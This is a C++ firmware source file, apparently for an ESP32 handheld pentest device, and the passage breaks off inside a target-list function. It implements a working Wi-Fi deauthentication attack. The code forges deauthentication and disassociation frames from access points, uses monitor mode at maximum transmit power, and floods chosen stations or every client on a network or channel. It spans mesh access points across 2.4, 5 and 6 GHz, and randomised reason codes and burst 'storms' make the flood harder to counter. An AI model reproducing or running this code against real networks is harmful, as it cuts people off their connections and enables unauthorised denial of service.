#include "deauther.h"
#include "clients.h"
#include "core/display.h"
#include "core/mykeyboard.h"
#include "core/net_utils.h"
#include "core/utils.h"
#include "core/wifi/webInterface.h"
#include "core/wifi/wifi_common.h"
#include "scan_hosts.h"
#include "wifi_atks.h"
#include "modules/wifi/sniffer.h"
#include <esp_wifi.h>
#include <esp_wifi_types.h>
#include <globals.h>
#include <iomanip>
#include <iostream>
#include <lwip/dns.h>
#include <lwip/err.h>
#include <lwip/etharp.h>
#include <lwip/igmp.h>
#include <lwip/inet.h>
#include <lwip/init.h>
#include <lwip/ip_addr.h>
#include <lwip/mem.h>
#include <lwip/memp.h>
#include <lwip/netif.h>
#include <lwip/sockets.h>
#include <lwip/sys.h>
#include <lwip/timeouts.h>
#include <sstream>

// WiFi header structure for parsing packets
struct wifi_header_t {
    uint16_t frame_ctrl;
    uint16_t duration;
    uint8_t addr1[6];
    uint8_t addr2[6];
    uint8_t addr3[6];
    uint16_t seq_ctrl;
} __attribute__((packed));

static const uint8_t DEAUTH_REASONS[] = {
    0x01, 0x04, 0x06, 0x07, 0x08, 0x0A, 0x0D, 0x0F, 0x12, 0x28
};
static const int DEAUTH_REASON_COUNT = sizeof(DEAUTH_REASONS) / sizeof(DEAUTH_REASONS[0]);

static const uint8_t DEAUTH_REASONS_5GHZ[] = {
    0x30, 0x31, 0x32, 0x33, 0x34, 0x07, 0x08, 0x0A, 0x0D, 0x0F
};
static const int DEAUTH_REASONS_5GHZ_COUNT = sizeof(DEAUTH_REASONS_5GHZ) / sizeof(DEAUTH_REASONS_5GHZ[0]);

struct APInfo {
    uint8_t bssid[6];
    int channel;
    int band;
    bool is_5ghz;
    int frequency;
};
static std::vector<APInfo> sameSSID_APs;

// Client detection globals
static std::vector<Host> detectedClients;
static uint8_t scanTargetBSSID[6];
static bool clientScanActive = false;

WiFiState saveWiFiState() {
    WiFiState state;
    state.was_connected = WiFi.isConnected();
    if (state.was_connected) {
        state.ssid = WiFi.SSID();
        state.bssid = WiFi.BSSIDstr();
        state.channel = WiFi.channel();
    }
    state.ap_active = WiFi.softAPgetStationNum() > 0 || WiFi.softAPSSID() != "";
    if (state.ap_active) {
        state.ap_ssid = WiFi.softAPSSID();
    }
    return state;
}

bool reconnectToWiFi(const String& ssid, const String& bssid) {
    if (ssid.length() == 0) return false;
    String password = bruceConfig.getWifiPassword(ssid);
    if (password == "") return false;
    WiFi.mode(WIFI_STA);
    WiFi.begin(ssid, password);
    int attempts = 0;
    while (WiFi.status() != WL_CONNECTED && attempts < 30) {
        vTaskDelay(200 / portTICK_PERIOD_MS);
        attempts++;
    }
    bool connected = WiFi.status() == WL_CONNECTED;
    if (connected) {
        wifiConnected = true;
        wifiIP = WiFi.localIP().toString();
        drawStatusBar();
    } else {
        wifiConnected = false;
    }
    return connected;
}

void restoreWiFiState(const WiFiState& state) {
    if (state.was_connected && state.ssid.length() > 0) {
        reconnectToWiFi(state.ssid, state.bssid);
    }
    if (state.ap_active && state.ap_ssid.length() > 0) {
        WiFi.mode(WIFI_AP_STA);
        WiFi.softAP(state.ap_ssid.c_str(), bruceConfig.wifiAp.pwd, state.channel, 0, 4, false);
    }
    if (!state.was_connected && !state.ap_active) {
        WiFi.mode(WIFI_STA);
    }
    if (WiFi.isConnected()) {
        wifiConnected = true;
        wifiIP = WiFi.localIP().toString();
    }
    drawStatusBar();
}

void getGatewayMAC(uint8_t gatewayMAC[6]) {
    wifi_ap_record_t ap_info;
    if (esp_wifi_sta_get_ap_info(&ap_info) == ESP_OK) {
        memcpy(gatewayMAC, ap_info.bssid, 6);
    }
}

bool isMACZero(const uint8_t *mac) {
    for (int i = 0; i < 6; i++) {
        if (mac[i] != 0x00) return false;
    }
    return true;
}

bool macCompare(const uint8_t *mac1, const uint8_t *mac2) {
    for (int i = 0; i < 6; i++) {
        if (mac1[i] != mac2[i]) return false;
    }
    return true;
}

int getWiFiBand(int channel) {
    if (channel >= 1 && channel <= 14) return 0;
    else if (channel >= 36 && channel <= 165) return 1;
    else if (channel >= 1 && channel <= 233) return 2;
    return 0;
}

void cacheSameSSIDAPs() {
    sameSSID_APs.clear();
    String currentSSID = WiFi.SSID();
    if (currentSSID.length() == 0) return;
    int n = WiFi.scanNetworks(false, false);
    for (int i = 0; i < n; i++) {
        if (WiFi.SSID(i) == currentSSID) {
            APInfo info;
            memcpy(info.bssid, WiFi.BSSID((uint8_t)i), 6);
            info.channel = WiFi.channel((uint8_t)i);
            info.band = getWiFiBand(info.channel);
            info.is_5ghz = (info.band == 1 || info.band == 2);
            if (info.band == 1) {
                info.frequency = 5000 + (info.channel - 36) * 20;
            } else if (info.band == 2) {
                info.frequency = 6000 + (info.channel - 1) * 20;
            } else {
                info.frequency = 2407 + info.channel * 5;
            }
            sameSSID_APs.push_back(info);
        }
    }
    WiFi.scanDelete();
}

const uint8_t* getDeauthReasons(int band, int* count) {
    if (band == 1 || band == 2) {
        *count = DEAUTH_REASONS_5GHZ_COUNT;
        return DEAUTH_REASONS_5GHZ;
    }
    *count = DEAUTH_REASON_COUNT;
    return DEAUTH_REASONS;
}

int getAPChannel(const uint8_t *target_bssid) {
    static unsigned long cache_time = 0;
    static uint8_t cached_bssid[6] = {0};
    static int cached_channel = 0;
    if (cache_time > 0 && millis() - cache_time < 5000) {
        if (macCompare(cached_bssid, target_bssid)) {
            return cached_channel;
        }
    }
    int found_channel = 0;
    int numNetworks = WiFi.scanNetworks(false, false);
    for (int i = 0; i < numNetworks; i++) {
        uint8_t *bssid_ptr = WiFi.BSSID((uint8_t)i);
        if (macCompare(bssid_ptr, target_bssid)) {
            found_channel = WiFi.channel((uint8_t)i);
            break;
        }
    }
    WiFi.scanDelete();
    if (found_channel == 0) {
        found_channel = WiFi.channel();
        if (found_channel == 0) found_channel = 1;
    }
    memcpy(cached_bssid, target_bssid, 6);
    cached_channel = found_channel;
    cache_time = millis();
    return found_channel;
}

bool tryMonitorMode(uint8_t channel) {
    wifi_mode_t current_mode;
    esp_wifi_get_mode(&current_mode);
    esp_wifi_stop();
    delay(5);
    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    esp_wifi_init(&cfg);
    esp_wifi_set_mode(WIFI_MODE_STA);
    wifi_promiscuous_filter_t filter = {.filter_mask = WIFI_PROMIS_FILTER_MASK_ALL};
    esp_wifi_set_promiscuous_filter(&filter);
    esp_wifi_set_promiscuous(true);
    esp_err_t err = esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    if (err != ESP_OK) {
        esp_wifi_set_promiscuous(false);
        esp_wifi_set_mode(current_mode);
        esp_wifi_start();
        return false;
    }
    esp_wifi_set_max_tx_power(78);
    return true;
}

void buildOptimizedDeauthFrame(
    uint8_t *frame, const uint8_t *dest, const uint8_t *src, const uint8_t *bssid, uint8_t reason = 0x07,
    bool is_disassoc = false
) {
    frame[0] = is_disassoc ? 0xA0 : 0xC0;
    frame[1] = 0x00;
    frame[2] = 0x00;
    frame[3] = 0x00;
    memcpy(&frame[4], dest, 6);
    memcpy(&frame[10], src, 6);
    memcpy(&frame[16], bssid, 6);
    static uint16_t seq = 0;
    seq = random(0, 4096);
    frame[22] = (seq >> 4) & 0xFF;
    frame[23] = ((seq & 0x0F) << 4);
    frame[24] = reason;
    frame[25] = 0x00;
}

void sendDeauthToAP(APInfo& ap, const uint8_t* targetMAC, bool enhanced_mode, int& total_frames) {
    uint8_t deauth_ap_to_sta[26];
    uint8_t disassoc_ap_to_sta[26];
    uint8_t deauth_sta_to_ap[26];
    uint8_t disassoc_sta_to_ap[26];
    int reason_count = 0;
    const uint8_t* reasons = getDeauthReasons(ap.band, &reason_count);
    uint8_t reason = reasons[random(reason_count)];
    buildOptimizedDeauthFrame(deauth_ap_to_sta, targetMAC, ap.bssid, ap.bssid, reason, false);
    buildOptimizedDeauthFrame(disassoc_ap_to_sta, targetMAC, ap.bssid, ap.bssid, reason, true);
    buildOptimizedDeauthFrame(deauth_sta_to_ap, ap.bssid, targetMAC, ap.bssid, reason, false);
    buildOptimizedDeauthFrame(disassoc_sta_to_ap, ap.bssid, targetMAC, ap.bssid, reason, true);
    if (enhanced_mode) {
        esp_wifi_set_channel(ap.channel, WIFI_SECOND_CHAN_NONE);
    }
    if (enhanced_mode) {
        wifiRawTx(WIFI_IF_STA, deauth_ap_to_sta, 26);
        wifiRawTx(WIFI_IF_STA, disassoc_ap_to_sta, 26);
        wifiRawTx(WIFI_IF_STA, deauth_sta_to_ap, 26);
        wifiRawTx(WIFI_IF_STA, disassoc_sta_to_ap, 26);
    } else {
        send_raw_frame(deauth_ap_to_sta, 26);
        vTaskDelay(pdMS_TO_TICKS(1));
        send_raw_frame(disassoc_ap_to_sta, 26);
        vTaskDelay(pdMS_TO_TICKS(1));
        send_raw_frame(deauth_sta_to_ap, 26);
        vTaskDelay(pdMS_TO_TICKS(1));
        send_raw_frame(disassoc_sta_to_ap, 26);
        vTaskDelay(pdMS_TO_TICKS(1));
    }
    total_frames += 4;
}

void stationDeauth(Host host) {
    WiFiState savedState = saveWiFiState();
    uint8_t targetMAC[6];
    stringToMAC(host.mac.c_str(), targetMAC);
    if (isMACZero(targetMAC)) {
        displayError("Invalid MAC address", true);
        return;
    }
    int channel = getAPChannel(targetMAC);
    if (channel == 0) {
        displayError("Could not find target AP", true);
        return;
    }
    int band = getWiFiBand(channel);
    bool is_5ghz = (band == 1 || band == 2);
    cacheSameSSIDAPs();
    bool useMultipleAPs = sameSSID_APs.size() > 1;
    std::vector<APInfo> ap_24ghz, ap_5ghz, ap_6ghz;
    for (auto& ap : sameSSID_APs) {
        switch (ap.band) {
            case 0: ap_24ghz.push_back(ap); break;
            case 1: ap_5ghz.push_back(ap); break;
            case 2: ap_6ghz.push_back(ap); break;
        }
    }
    bool has_multiple_bands = (ap_24ghz.size() > 0 && ap_5ghz.size() > 0) ||
                              (ap_24ghz.size() > 0 && ap_6ghz.size() > 0) ||
                              (ap_5ghz.size() > 0 && ap_6ghz.size() > 0);
    bool enhanced_mode = tryMonitorMode(channel);
    if (!enhanced_mode) {
        wifiDisconnect();
        delay(10);
        WiFi.mode(WIFI_AP);
        String currentSsid = WiFi.SSID();
        if (currentSsid.length() == 0) { currentSsid = "DEAUTH_" + String(random(1000, 9999)); }
        if (!WiFi.softAP(currentSsid.c_str(), emptyString, channel, 1, 4, false)) {
            displayError("Fail starting Deauth", true);
            return;
        }
    }
    uint8_t deauth_ap_to_sta[26];
    uint8_t disassoc_ap_to_sta[26];
    uint8_t deauth_sta_to_ap[26];
    uint8_t disassoc_sta_to_ap[26];
    uint8_t broadcast_mac[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
    buildOptimizedDeauthFrame(deauth_ap_to_sta, targetMAC, targetMAC, targetMAC, 0x07, false);
    buildOptimizedDeauthFrame(disassoc_ap_to_sta, targetMAC, targetMAC, targetMAC, 0x07, true);
    buildOptimizedDeauthFrame(deauth_sta_to_ap, targetMAC, targetMAC, targetMAC, 0x07, false);
    buildOptimizedDeauthFrame(disassoc_sta_to_ap, targetMAC, targetMAC, targetMAC, 0x07, true);
    drawMainBorderWithTitle("Station Deauth");
    tft.setTextSize(FP);
    padprintln("Trying to deauth one target.");
    padprintln("Tgt:" + host.mac);
    String bandStr = (band == 1) ? "5GHz" : (band == 2) ? "6GHz" : "2.4GHz";
    padprintln("CH:" + String(channel) + " (" + bandStr + ")");
    padprintln("Mode:" + String(enhanced_mode ? "Enhanced" : "AP"));
    if (useMultipleAPs) {
        padprintln("Mesh: " + String(sameSSID_APs.size()) + " APs");
        if (has_multiple_bands) {
            padprintln("MULTI-BAND ATTACK");
            if (ap_24ghz.size() > 0) padprintln("  2.4GHz: " + String(ap_24ghz.size()) + " APs");
            if (ap_5ghz.size() > 0) padprintln("  5GHz: " + String(ap_5ghz.size()) + " APs");
            if (ap_6ghz.size() > 0) padprintln("  6GHz: " + String(ap_6ghz.size()) + " APs");
        }
    }
    padprintln("");
    padprintln("Press BACK to STOP.");
    
    SelPress = false;
    EscPress = false;
    PrevPress = false;
    NextPress = false;
    delay(100);
    
    long tmp = millis();
    int cont = 0;
    int total_frames = 0;
    uint8_t current_reason = 0;
    int reason_index = 0;
    int ap_index = 0;
    bool storm_active = false;
    uint32_t burst_counter = 0;
    uint8_t consecutive_failures = 0;
    while (!check(EscPress)) {
        if (cont % 20 == 0) {
            int reason_count = 0;
            const uint8_t* reasons = getDeauthReasons(band, &reason_count);
            reason_index = (reason_index + 1) % reason_count;
            current_reason = reasons[reason_index];
        }
        if (useMultipleAPs && has_multiple_bands) {
            int band_cycle = (cont / 4) % 3;
            APInfo* target_ap = nullptr;
            switch (band_cycle) {
                case 0: if (!ap_24ghz.empty()) target_ap = &ap_24ghz[ap_index % ap_24ghz.size()]; break;
                case 1: if (!ap_5ghz.empty()) target_ap = &ap_5ghz[ap_index % ap_5ghz.size()]; break;
                case 2: if (!ap_6ghz.empty()) target_ap = &ap_6ghz[ap_index % ap_6ghz.size()]; break;
            }
            if (target_ap != nullptr) {
                sendDeauthToAP(*target_ap, targetMAC, enhanced_mode, total_frames);
                ap_index++;
                cont += 4;
                burst_counter++;
            } else {
                if (enhanced_mode) {
                    wifiRawTx(WIFI_IF_STA, deauth_ap_to_sta, 26);
                    wifiRawTx(WIFI_IF_STA, disassoc_ap_to_sta, 26);
                    wifiRawTx(WIFI_IF_STA, deauth_sta_to_ap, 26);
                    wifiRawTx(WIFI_IF_STA, disassoc_sta_to_ap, 26);
                } else {
                    send_raw_frame(deauth_ap_to_sta, 26);
                    vTaskDelay(pdMS_TO_TICKS(1));
                    send_raw_frame(disassoc_ap_to_sta, 26);
                    vTaskDelay(pdMS_TO_TICKS(1));
                    send_raw_frame(deauth_sta_to_ap, 26);
                    vTaskDelay(pdMS_TO_TICKS(1));
                    send_raw_frame(disassoc_sta_to_ap, 26);
                    vTaskDelay(pdMS_TO_TICKS(1));
                }
                cont += 4;
                total_frames += 4;
                burst_counter++;
            }
        } else if (useMultipleAPs) {
            ap_index = (ap_index + 1) % sameSSID_APs.size();
            APInfo& current_ap = sameSSID_APs[ap_index];
            if (enhanced_mode && current_ap.channel != channel) {
                esp_wifi_set_channel(current_ap.channel, WIFI_SECOND_CHAN_NONE);
            }
            buildOptimizedDeauthFrame(deauth_ap_to_sta, targetMAC, current_ap.bssid, current_ap.bssid, current_reason, false);
            buildOptimizedDeauthFrame(disassoc_ap_to_sta, targetMAC, current_ap.bssid, current_ap.bssid, current_reason, true);
            buildOptimizedDeauthFrame(deauth_sta_to_ap, current_ap.bssid, targetMAC, current_ap.bssid, current_reason, false);
            buildOptimizedDeauthFrame(disassoc_sta_to_ap, current_ap.bssid, targetMAC, current_ap.bssid, current_reason, true);
            if (enhanced_mode) {
                wifiRawTx(WIFI_IF_STA, deauth_ap_to_sta, 26);
                wifiRawTx(WIFI_IF_STA, disassoc_ap_to_sta, 26);
                wifiRawTx(WIFI_IF_STA, deauth_sta_to_ap, 26);
                wifiRawTx(WIFI_IF_STA, disassoc_sta_to_ap, 26);
            } else {
                send_raw_frame(deauth_ap_to_sta, 26);
                vTaskDelay(pdMS_TO_TICKS(1));
                send_raw_frame(disassoc_ap_to_sta, 26);
                vTaskDelay(pdMS_TO_TICKS(1));
                send_raw_frame(deauth_sta_to_ap, 26);
                vTaskDelay(pdMS_TO_TICKS(1));
                send_raw_frame(disassoc_sta_to_ap, 26);
                vTaskDelay(pdMS_TO_TICKS(1));
            }
            cont += 4;
            total_frames += 4;
            burst_counter++;
        } else {
            if (enhanced_mode) {
                wifiRawTx(WIFI_IF_STA, deauth_ap_to_sta, 26);
                wifiRawTx(WIFI_IF_STA, disassoc_ap_to_sta, 26);
                wifiRawTx(WIFI_IF_STA, deauth_sta_to_ap, 26);
                wifiRawTx(WIFI_IF_STA, disassoc_sta_to_ap, 26);
            } else {
                send_raw_frame(deauth_ap_to_sta, 26);
                vTaskDelay(pdMS_TO_TICKS(1));
                send_raw_frame(disassoc_ap_to_sta, 26);
                vTaskDelay(pdMS_TO_TICKS(1));
                send_raw_frame(deauth_sta_to_ap, 26);
                vTaskDelay(pdMS_TO_TICKS(1));
                send_raw_frame(disassoc_sta_to_ap, 26);
                vTaskDelay(pdMS_TO_TICKS(1));
            }
            cont += 4;
            total_frames += 4;
            burst_counter++;
        }
        if (cont % 5 == 0) {
            uint8_t broadcast_frame[26];
            int reason_count = 0;
            const uint8_t* reasons = getDeauthReasons(band, &reason_count);
            uint8_t broadcast_reason = reasons[random(reason_count)];
            if (useMultipleAPs && !sameSSID_APs.empty()) {
                APInfo& current_ap = sameSSID_APs[ap_index % sameSSID_APs.size()];
                buildOptimizedDeauthFrame(broadcast_frame, broadcast_mac, current_ap.bssid, current_ap.bssid, broadcast_reason, false);
            } else {
                buildOptimizedDeauthFrame(broadcast_frame, broadcast_mac, targetMAC, targetMAC, broadcast_reason, false);
            }
            if (enhanced_mode) {
                wifiRawTx(WIFI_IF_STA, broadcast_frame, 26);
            } else {
                send_raw_frame(broadcast_frame, 26);
            }
            vTaskDelay(pdMS_TO_TICKS(1));
            total_frames++;
        }
        if (cont % 50 == 0) {
            if (burst_counter > 100 && random(100) < 30) {
                storm_active = true;
            }
            if (storm_active) {
                for (int burst = 0; burst < 10; burst++) {
                    int reason_count = 0;
                    const uint8_t* reasons = getDeauthReasons(band, &reason_count);
                    uint8_t burst_reason = reasons[random(reason_count)];
                    if (useMultipleAPs && !sameSSID_APs.empty()) {
                        APInfo& current_ap = sameSSID_APs[ap_index % sameSSID_APs.size()];
                        buildOptimizedDeauthFrame(deauth_ap_to_sta, targetMAC, current_ap.bssid, current_ap.bssid, burst_reason, false);
                        buildOptimizedDeauthFrame(disassoc_ap_to_sta, targetMAC, current_ap.bssid, current_ap.bssid, burst_reason, true);
                        buildOptimizedDeauthFrame(deauth_sta_to_ap, current_ap.bssid, targetMAC, current_ap.bssid, burst_reason, false);
                        buildOptimizedDeauthFrame(disassoc_sta_to_ap, current_ap.bssid, targetMAC, current_ap.bssid, burst_reason, true);
                    }
                    if (enhanced_mode) {
                        wifiRawTx(WIFI_IF_STA, deauth_ap_to_sta, 26);
                        wifiRawTx(WIFI_IF_STA, disassoc_ap_to_sta, 26);
                        wifiRawTx(WIFI_IF_STA, deauth_sta_to_ap, 26);
                        wifiRawTx(WIFI_IF_STA, disassoc_sta_to_ap, 26);
                    } else {
                        send_raw_frame(deauth_ap_to_sta, 26);
                        vTaskDelay(pdMS_TO_TICKS(1));
                        send_raw_frame(disassoc_ap_to_sta, 26);
                        vTaskDelay(pdMS_TO_TICKS(1));
                        send_raw_frame(deauth_sta_to_ap, 26);
                        vTaskDelay(pdMS_TO_TICKS(1));
                        send_raw_frame(disassoc_sta_to_ap, 26);
                        vTaskDelay(pdMS_TO_TICKS(1));
                    }
                    total_frames += 4;
                    burst_counter++;
                    vTaskDelay(pdMS_TO_TICKS(1));
                }
                if (random(100) < 20) {
                    storm_active = false;
                }
            } else {
                for (int burst = 0; burst < 5; burst++) {
                    int reason_count = 0;
                    const uint8_t* reasons = getDeauthReasons(band, &reason_count);
                    uint8_t burst_reason = reasons[random(reason_count)];
                    if (useMultipleAPs && !sameSSID_APs.empty()) {
                        APInfo& current_ap = sameSSID_APs[ap_index % sameSSID_APs.size()];
                        buildOptimizedDeauthFrame(deauth_ap_to_sta, targetMAC, current_ap.bssid, current_ap.bssid, burst_reason, false);
                        buildOptimizedDeauthFrame(disassoc_ap_to_sta, targetMAC, current_ap.bssid, current_ap.bssid, burst_reason, true);
                        buildOptimizedDeauthFrame(deauth_sta_to_ap, current_ap.bssid, targetMAC, current_ap.bssid, burst_reason, false);
                        buildOptimizedDeauthFrame(disassoc_sta_to_ap, current_ap.bssid, targetMAC, current_ap.bssid, burst_reason, true);
                    }
                    if (enhanced_mode) {
                        wifiRawTx(WIFI_IF_STA, deauth_ap_to_sta, 26);
                        wifiRawTx(WIFI_IF_STA, disassoc_ap_to_sta, 26);
                        wifiRawTx(WIFI_IF_STA, deauth_sta_to_ap, 26);
                        wifiRawTx(WIFI_IF_STA, disassoc_sta_to_ap, 26);
                    } else {
                        send_raw_frame(deauth_ap_to_sta, 26);
                        vTaskDelay(pdMS_TO_TICKS(1));
                        send_raw_frame(disassoc_ap_to_sta, 26);
                        vTaskDelay(pdMS_TO_TICKS(1));
                        send_raw_frame(deauth_sta_to_ap, 26);
                        vTaskDelay(pdMS_TO_TICKS(1));
                        send_raw_frame(disassoc_sta_to_ap, 26);
                        vTaskDelay(pdMS_TO_TICKS(1));
                    }
                    total_frames += 4;
                    burst_counter++;
                    vTaskDelay(pdMS_TO_TICKS(1));
                }
            }
        }
        int delay_ms;
        if (storm_active) {
            delay_ms = random(1, 3);
        } else if (consecutive_failures > 5) {
            delay_ms = random(5, 15);
            consecutive_failures = 0;
        } else {
            delay_ms = random(2, 8);
        }
        delay(delay_ms);
        if (millis() - tmp > 1000) {
            int fps = cont;
            cont = 0;
            tmp = millis();
            tft.fillRect(tftWidth - 100, tftHeight - 40, 100, 40, TFT_BLACK);
            tft.drawRightString(String(fps) + " fps", tftWidth - 12, tftHeight - 36, 1);
            tft.drawRightString("Total: " + String(total_frames), tftWidth - 12, tftHeight - 20, 1);
            if (storm_active) {
                tft.drawRightString("STORM", tftWidth - 12, tftHeight - 56, 1);
            }
            if (has_multiple_bands) {
                tft.drawRightString("MULTI-BAND", tftWidth - 12, tftHeight - 72, 1);
            }
        }
    }
    if (enhanced_mode) {
        esp_wifi_set_promiscuous(false);
    }
    wifiDisconnect();
    WiFi.mode(WIFI_STA);
    tft.fillRect(0, tftHeight - 60, tftWidth, 60, TFT_BLACK);
    padprintln("Attack stopped.");
    padprintln("Frames sent: " + String(total_frames));
    padprintln("Bursts: " + String(burst_counter));
    if (is_5ghz) {
        padprintln("5GHz/6GHz mode used");
    }
    if (has_multiple_bands) {
        padprintln("Multi-band attack used");
    }
    delay(1000);
}

void runDeauthAll(uint8_t* targetMAC, int channel) {
    WiFiState savedState = saveWiFiState();
    int band = getWiFiBand(channel);
    cacheSameSSIDAPs();
    bool useMultipleAPs = sameSSID_APs.size() > 1;
    bool enhanced_mode = tryMonitorMode(channel);
    if (!enhanced_mode) {
        wifiDisconnect();
        delay(10);
        WiFi.mode(WIFI_AP);
        if (!WiFi.softAP("DEAUTH_ALL", emptyString, channel, 1, 4, false)) {
            displayError("Failed to start Deauth", true);
            return;
        }
    }
    drawMainBorderWithTitle("Deauth All");
    tft.setTextSize(FP);
    padprintln("Deauthing all clients...");
    String bandStr = (band == 1) ? "5GHz" : (band == 2) ? "6GHz" : "2.4GHz";
    padprintln("Channel: " + String(channel) + " (" + bandStr + ")");
    padprintln("Mode: " + String(enhanced_mode ? "Enhanced" : "AP"));
    if (useMultipleAPs) {
        padprintln("Mesh: " + String(sameSSID_APs.size()) + " APs");
    }
    padprintln("");
    padprintln("Press BACK to STOP.");
    
    SelPress = false;
    EscPress = false;
    PrevPress = false;
    NextPress = false;
    delay(100);
    
    uint8_t broadcast_mac[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
    uint8_t frame[26];
    uint32_t start_time = millis();
    int total_frames = 0;
    int ap_index = 0;
    int reason_index = 0;
    bool storm_active = false;
    uint32_t burst_counter = 0;
    while (!check(EscPress)) {
        if (total_frames % 20 == 0) {
            int reason_count = 0;
            const uint8_t* reasons = getDeauthReasons(band, &reason_count);
            reason_index = (reason_index + 1) % reason_count;
        }
        int reason_count = 0;
        const uint8_t* reasons = getDeauthReasons(band, &reason_count);
        uint8_t reason = reasons[reason_index];
        if (useMultipleAPs) {
            ap_index = (ap_index + 1) % sameSSID_APs.size();
            APInfo& current_ap = sameSSID_APs[ap_index];
            if (enhanced_mode && current_ap.channel != channel) {
                esp_wifi_set_channel(current_ap.channel, WIFI_SECOND_CHAN_NONE);
            }
            buildOptimizedDeauthFrame(frame, broadcast_mac, current_ap.bssid, current_ap.bssid, reason, false);
        } else {
            buildOptimizedDeauthFrame(frame, broadcast_mac, targetMAC, targetMAC, reason, false);
        }
        if (enhanced_mode) {
            wifiRawTx(WIFI_IF_STA, frame, 26);
        } else {
            send_raw_frame(frame, 26);
        }
        total_frames++;
        burst_counter++;
        if (total_frames % 100 == 0 && random(100) < 40) {
            storm_active = true;
        }
        int delay_ms;
        if (storm_active) {
            delay_ms = random(1, 3);
            if (random(100) < 30) {
                uint8_t extra_reason = reasons[random(reason_count)];
                if (useMultipleAPs) {
                    APInfo& current_ap = sameSSID_APs[ap_index % sameSSID_APs.size()];
                    buildOptimizedDeauthFrame(frame, broadcast_mac, current_ap.bssid, current_ap.bssid, extra_reason, false);
                } else {
                    buildOptimizedDeauthFrame(frame, broadcast_mac, targetMAC, targetMAC, extra_reason, false);
                }
                if (enhanced_mode) {
                    wifiRawTx(WIFI_IF_STA, frame, 26);
                } else {
                    send_raw_frame(frame, 26);
                }
                total_frames++;
                burst_counter++;
            }
            if (random(100) < 10) {
                storm_active = false;
            }
        } else {
            delay_ms = random(5, 15);
        }
        delay(delay_ms);
        if (millis() - start_time > 2000) {
            start_time = millis();
            tft.fillRect(tftWidth - 100, tftHeight - 40, 100, 40, TFT_BLACK);
            tft.drawRightString("Total: " + String(total_frames), tftWidth - 12, tftHeight - 20, 1);
            if (storm_active) {
                tft.drawRightString("STORM", tftWidth - 12, tftHeight - 56, 1);
            }
        }
    }
    if (enhanced_mode) {
        esp_wifi_set_promiscuous(false);
    }
    wifiDisconnect();
    WiFi.mode(WIFI_STA);
    delay(500);
    tft.fillRect(0, tftHeight - 60, tftWidth, 60, TFT_BLACK);
    padprintln("Attack stopped.");
    padprintln("Frames sent: " + String(total_frames));
    delay(1500);
}

void deauthAllFromScan() {
    WiFiState savedState = saveWiFiState();
    drawMainBorderWithTitle("Select AP");
    
    displayTextLine("Scanning for networks...");
    int n = WiFi.scanNetworks(false, false);
    if (n == 0) {
        displayError("No networks found", true);
        return;
    }
    
    options.clear();
    for (int i = 0; i < n; i++) {
        String ssid = WiFi.SSID(i);
        String bssid = WiFi.BSSIDstr(i);
        int channel = WiFi.channel(i);
        int rssi = WiFi.RSSI(i);
        
        String displayName = ssid.length() > 0 ? ssid : "<Hidden>";
        String optionText = displayName + " (" + String(rssi) + "dBm|ch" + String(channel) + ")";
        
        options.push_back({optionText.c_str(), [=]() {
            uint8_t targetMAC[6];
            memcpy(targetMAC, WiFi.BSSID((uint8_t)i), 6);
            int ch = WiFi.channel((uint8_t)i);
            WiFi.scanDelete();
            
            SelPress = false;
            EscPress = false;
            PrevPress = false;
            NextPress = false;
            delay(100);
            
            runDeauthAll(targetMAC, ch);
        }});
    }
    options.push_back({"Back", []() { returnToMenu = true; }});
    
    addOptionToMainMenu();
    loopOptions(options);
}

void deauthAllByChannel() {
    WiFiState savedState = saveWiFiState();
    drawMainBorderWithTitle("Select Channel");
    
    options.clear();
    for (int ch = 1; ch <= 14; ch++) {
        String band = (ch >= 1 && ch <= 11) ? "2.4GHz" : (ch >= 36 ? "5GHz" : "2.4GHz");
        String optionText = "Channel " + String(ch) + " (" + band + ")";
        options.push_back({optionText.c_str(), [=]() {
            uint8_t broadcast_mac[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
            
            SelPress = false;
            EscPress = false;
            PrevPress = false;
            NextPress = false;
            delay(100);
            
            runDeauthAll(broadcast_mac, ch);
        }});
    }
    options.push_back({"Back", []() { returnToMenu = true; }});
    
    addOptionToMainMenu();
    loopOptions(options);
}

void deauthAllMenu() {
    drawMainBorderWithTitle("Deauth All");
    
    options = {
        {"Select from Scan", [=]() { deauthAllFromScan(); }},
        {"Select Channel", [=]() { deauthAllByChannel(); }},
        {"Back", [=]() { returnToMenu = true; }},
    };
    addOptionToMainMenu();
    loopOptions(options);
}

void runDeauthTargetList(const std::vector<Host>& targets, uint8_t* targetMAC, int channel) {
    if (targets.empty()) {
        displayError("No targets selected", true);
        return;
    }
    WiFiState savedState = saveWiFiState();
    int band = getWiFiBand(channel);
    cacheSameSSIDAPs();
    bool useMultipleAPs = sameSSID_APs.size() > 1;
    bool enhanced_mode = tryMonitorMode(channel);
    if (!enhanced_mode) {
        wifiDisconnect();
        delay(10);
        WiFi.mode(WIFI_AP);
        if (!WiFi.softAP("DEAUTH_LIST", emptyString, channel, 1, 4, false)) {
            displayError("Failed to start Deauth", true);
            return;
        }
    }
    drawMainBorderWithTitle("Deauth List");
    tft.setTextSize(FP);
    padprintln("Deauthing " + String(targets.size()) + " targets...");
    String bandStr = (band == 1) ? "5GHz" : (band == 2) ? "6GHz" : "2.4GHz";
    padprintln("Channel: " + String(channel) + " (" + bandStr + ")");
    padprintln("Mode: " + String(enhanced_mode ? "Enhanced" : "AP"));
    if (useMultipleAPs) {
        padprintln("Mesh: " + String(sameSSID_APs.size()) + " APs");
    }
    padprintln("");
    padprintln("Press BACK to STOP.");
    
    SelPress = false;
    EscPress = false;
    PrevPress = false;
    NextPress = false;
    delay(100);
    
    uint32_t start_time = millis();
    int total_frames = 0;
    size_t target_index = 0;
    int ap_index = 0;
    bool storm_active = false;
    uint32_t burst_counter = 0;
    while (!check(EscPress)) {
        if (target_index >= targets.size()) {
            target_index = 0;
        }
        const Host& host = targets[target_index];
        uint8_t hostMAC[6];
        stringToMAC(host.mac.c_str(), hostMAC);
        if (!isMACZero(hostMAC)) {
            uint8_t frames[4][26];
            int reason_count = 0;
            const uint8_t* reasons = getDeauthReasons(band, &reason_count);
            uint8_t reason = reasons[random(reason_count)];
            if (useMultipleAPs) {
                ap_index = (ap_index + 1) % sameSSID_APs.size();
                APInfo& current_ap = sameSSID_APs[ap_index];
                if (enhanced_mode && current_ap.channel != channel) {
